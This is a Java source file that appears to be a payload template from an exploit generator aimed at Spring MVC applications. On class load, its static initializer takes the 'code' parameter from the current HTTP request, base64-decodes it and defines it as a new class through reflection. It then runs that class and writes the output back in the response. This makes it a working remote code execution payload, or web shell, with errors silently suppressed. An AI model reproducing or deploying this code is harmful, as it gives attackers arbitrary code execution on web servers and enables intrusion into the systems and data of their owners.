package jeg.core.template.springmvc;

import java.io.Writer;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class SpringMVCCodeExecTpl {

    static {
        try {
            new SpringMVCCodeExecTpl();
        } catch (Exception e) {
        }
    }

    private String getReqParamName() {
        return "code";
    }


    public SpringMVCCodeExecTpl() throws Exception {
        run();
    }

    private void run() {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            Object requestAttributes = invokeMethod(classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
            Object request = invokeMethod(requestAttributes, "getRequest");
            Object response = invokeMethod(requestAttributes, "getResponse");
            String code = (String)invokeMethod(request, "getParameter",new Class[]{String.class},new Object[]{getReqParamName()});
            if (code != null && !code.isEmpty()) {
                Writer writer = (Writer) invokeMethod(response,"getWriter");
                writer.write(exec(code));
                writer.flush();
                writer.close();
            }
        } catch (Exception e) {
        }
    }


    private String exec(String var2) {
        try {
            byte[] clazzByte = base64Decode(var2);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
            return clazz.newInstance().toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }

    private Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    private Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}

